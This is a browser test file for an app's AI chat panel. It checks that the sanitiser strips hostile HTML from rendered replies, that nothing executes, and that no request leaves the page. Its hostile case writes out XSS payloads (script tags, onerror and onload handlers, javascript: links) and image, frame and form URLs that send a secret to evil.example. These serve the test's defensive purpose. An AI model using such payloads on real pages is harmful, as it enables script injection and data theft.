// What a reply of the AI chat does to the page (docs/design.md section 6.12): while it streams it is text, once it is
// finished the core renders it as Markdown and the page copies the answer through its own allow-list, so a script, a
// handler, a style, an image or a `javascript:` link that a broken sanitiser let through still never reaches the DOM, no
// request leaves for an image, and a link that carries data is text followed by its address.
import assert from "node:assert/strict";
import { boot, calls, openAi, sendText } from "./ai-lib.mjs";

export default async function ({ page, url, errors }) {
  page.setDefaultTimeout(8000);
  await markdownCase(page, url);
  await hostileCase(page, url);
  // The policy of the page refuses an inline style, also in the inert document the page parses a reply in; the hostile
  // reply above carries one on purpose, so those reports are expected. Anything else is an error.
  const refused = /style-src-(elem|attr) blocked inline \(.*safehtml\.js\)/;
  errors.splice(0, errors.length, ...errors.filter((e) => !refused.test(e)));
  await linkCase(page, url);
  assert.deepEqual(errors, [], "the page reported errors");
}

const REPLY_HTML = '<p>Check <code>talosctl health</code>.</p><pre><code class="language-sh">talosctl health</code></pre>';

/** Wait until the chat shows `n` messages and no reply is streaming. */
const settled = (page, n) =>
  page.waitForFunction((count) => document.querySelectorAll(".chat-msg").length === count && !document.querySelector(".chat-partial"), n);

async function markdownCase(page, url) {
  await boot(page, url);
  await page.evaluate((html) => window.__MOCK__.on("markdown_render", () => html), REPLY_HTML);
  await openAi(page);
  await page.evaluate(() => window.__MOCK__.ai.hold(2));
  await sendText(page, "show me");
  // While the reply streams it is text, and the core's renderer is not asked.
  await page.waitForFunction(() => document.querySelector(".chat-partial .chat-text")?.textContent === "Hello ");
  assert.equal(await page.locator(".chat-partial .chat-text").evaluate((n) => n.children.length), 0, "a text node");
  assert.equal((await calls(page, "markdown_render")).length, 0);

  // A finished reply is sent once, with exactly its text, and comes back as elements of the allow-list.
  await page.evaluate(() => window.__MOCK__.ai.release());
  await settled(page, 2);
  await page.waitForSelector('.chat-msg[data-role="assistant"] .chat-text pre');
  assert.deepEqual(await calls(page, "markdown_render"), [{ text: "Hello there." }]);
  const assistant = page.locator('.chat-msg[data-role="assistant"] .chat-text');
  assert.equal(await assistant.locator("p").count(), 1);
  assert.equal(await assistant.locator("p code").textContent(), "talosctl health");
  assert.equal(await assistant.locator("pre code").getAttribute("class"), "language-sh");
  assert.equal(await page.locator('.chat-msg[data-role="user"] .chat-text').evaluate((n) => n.children.length), 0, "a user message is text");

  // A redraw, a snapshot or a focus asks for nothing again.
  await page.evaluate(() => window.dispatchEvent(new Event("focus")));
  await page.waitForFunction(() => window.__MOCK__.callsOf("ai_turn_snapshot").length >= 3);
  await page.waitForTimeout(150);
  assert.equal((await calls(page, "markdown_render")).length, 1, "one call for one message");

  // A tab switch draws the chat again from the kept session: the Markdown is back and the core is not asked again.
  const shown = await page.evaluate(() => window.__MOCK__.view());
  const hidden = { ...shown, focus: 2, panes: shown.panes.filter(([id]) => id !== 3) };
  await page.evaluate((v) => window.__MOCK__.emit("layout", v), hidden);
  await page.waitForFunction(() => document.querySelectorAll(".block-chat").length === 0);
  await page.evaluate((v) => window.__MOCK__.emit("layout", v), shown);
  await page.waitForSelector('.chat-msg[data-role="assistant"] .chat-text pre');
  assert.equal((await calls(page, "markdown_render")).length, 1, "the cache answered");

  // A null answer (a text the renderer does not take) keeps the plain text.
  await page.evaluate(() => window.__MOCK__.on("markdown_render", () => null));
  await sendText(page, "again");
  await settled(page, 4);
  await page.waitForFunction(() => window.__MOCK__.callsOf("markdown_render").length === 2);
  const second = page.locator('.chat-msg[data-role="assistant"] .chat-text').nth(1);
  assert.equal(await second.textContent(), "Hello there.");
  assert.equal(await second.evaluate((n) => n.children.length), 0);

  // A reply that was stopped is not Markdown: nothing is asked.
  await page.evaluate(() => window.__MOCK__.ai.hold(2));
  await sendText(page, "stop this one");
  await page.waitForFunction(() => document.querySelector(".chat-partial .chat-text")?.textContent === "Hello ");
  await page.locator(".chat-send").click();
  await page.waitForFunction(() => document.querySelector('.chat-msg[data-status="cancelled"]'));
  await page.waitForTimeout(150);
  assert.equal((await calls(page, "markdown_render")).length, 2, "a stopped reply is not rendered");
  assert.equal(await page.locator('.chat-msg[data-status="cancelled"] .chat-text').evaluate((n) => n.children.length), 0);
}

async function hostileCase(page, url) {
  const requests = [];
  page.on("request", (r) => requests.push(r.url()));
  await boot(page, url);
  await openAi(page);
  // What a failed sanitiser could let through, and a document that is far too deep and far too wide.
  await page.evaluate(() => {
    const nested = `${"<div>".repeat(200)}deep${"</div>".repeat(200)}`;
    const many = "<span>x</span>".repeat(300000);
    const html =
      "<p>ok</p><script>window.__XSS = 1</script>" +
      '<img src="https://evil.example/x.png?d=SECRET" onerror="window.__XSS = 1">' +
      '<iframe src="https://evil.example/f"></iframe><svg onload="window.__XSS = 1"><image href="https://evil.example/i.png"/></svg>' +
      '<form action="https://evil.example/p"><input name="x"></form><style>* { display: none }</style><math><mi>x</mi></math>' +
      '<a href="javascript:window.__XSS = 1">js</a><div style="position:fixed" onclick="window.__XSS = 1">styled</div>' +
      nested +
      many;
    window.__MOCK__.on("markdown_render", () => html);
  });
  await sendText(page, "attack");
  await settled(page, 2);
  await page.waitForSelector('.chat-msg[data-role="assistant"] .chat-text p');
  const found = await page.evaluate(() => {
    const log = document.querySelector(".chat-log");
    const text = document.querySelector('.chat-msg[data-role="assistant"] .chat-text');
    const depth = (n) => {
      let d = 0;
      for (let p = n; p && p !== text; p = p.parentElement) d += 1;
      return d;
    };
    const attrs = [];
    let deepest = 0;
    for (const n of log.querySelectorAll("*")) {
      for (const a of n.attributes) if (a.name.startsWith("on") || a.name === "style") attrs.push(`${n.localName}.${a.name}`);
      deepest = Math.max(deepest, depth(n));
    }
    return {
      banned: log.querySelectorAll("script, img, iframe, svg, form, style, math, image, input").length,
      attrs,
      js: log.querySelectorAll('a[href^="javascript"]').length,
      deepest,
      nodes: log.querySelectorAll("*").length,
      xss: typeof window.__XSS,
    };
  });
  assert.equal(found.banned, 0, "no script, image, frame, svg, form, style or math element");
  assert.deepEqual(found.attrs, [], "no handler and no style attribute");
  assert.equal(found.js, 0, "no javascript: link");
  assert.ok(found.deepest <= 65, `nested no deeper than 64 levels (${found.deepest})`);
  assert.ok(found.nodes <= 200_100, `the copy is bounded (${found.nodes} nodes)`);
  assert.equal(found.xss, "undefined", "nothing ran");
  assert.equal(await page.evaluate(() => 1 + 1), 2, "the page stayed responsive");
  assert.deepEqual(requests.filter((u) => u.includes("evil.example")), [], "no request left for another host");

  // Half an element in a streaming delta is shown as it is: text, with no element made from it.
  const half = "<img src=x onerror=window.__XSS=1><scr";
  await page.evaluate((chunk) => window.__MOCK__.ai.script({ chunks: [chunk], stall: true }), half);
  await sendText(page, "stream it");
  await page.waitForFunction(() => document.querySelector(".chat-partial .chat-text")?.textContent.length > 0);
  assert.equal(await page.locator(".chat-partial .chat-text").textContent(), half);
  assert.equal(await page.locator(".chat-partial .chat-text").evaluate((n) => n.children.length), 0);
  assert.equal(await page.evaluate(() => typeof window.__XSS), "undefined");
  await page.locator(".chat-send").click();
  await page.waitForFunction(() => document.querySelector(".chat-send")?.dataset.mode === "send");
  assert.deepEqual(requests.filter((u) => u.includes("evil.example")), []);
}

async function linkCase(page, url) {
  await boot(page, url);
  await openAi(page);
  const html =
    '<p><a href="https://example.org/docs">docs</a> <a href="https://example.org/?d=SECRET">secret</a> ' +
    '<a href="mailto:a@example.org?subject=x">mail</a> <a href="javascript:alert(1)">js</a> <a>bare</a></p>';
  await page.evaluate((h) => window.__MOCK__.on("markdown_render", () => h), html);
  await sendText(page, "links");
  await settled(page, 2);
  await page.waitForSelector(".chat-md");
  const text = page.locator('.chat-msg[data-role="assistant"] .chat-text');
  // Only the plain address is a link; the others are text, and the address follows a link that carries data.
  assert.equal(await text.locator("a").count(), 1);
  assert.equal(await text.locator("a").getAttribute("href"), "https://example.org/docs");
  assert.equal(await text.locator("a").getAttribute("title"), "https://example.org/docs");
  assert.equal(await text.locator("a").getAttribute("target"), null, "the page opens no window by itself");
  assert.equal(
    await text.locator("p").textContent(),
    "docs secret [https://example.org/?d=SECRET] mail [mailto:a@example.org?subject=x] js bare",
  );

  // A click opens it through the shell and the page does not move; a middle click does nothing.
  const here = page.url();
  await text.locator("a").click();
  await page.waitForFunction(() => window.__MOCK__.callsOf("open_url").length === 1);
  assert.deepEqual(await calls(page, "open_url"), [{ url: "https://example.org/docs" }]);
  assert.equal(page.url(), here, "the page's address did not change");
  await text.locator("a").click({ button: "middle" });
  await page.waitForTimeout(100);
  assert.equal((await calls(page, "open_url")).length, 1, "a middle click opens nothing");
  assert.equal(page.url(), here);
  // Text that is no link does nothing when it is clicked.
  await text.locator("p").click({ position: { x: 200, y: 5 } });
  assert.equal((await calls(page, "open_url")).length, 1);
}
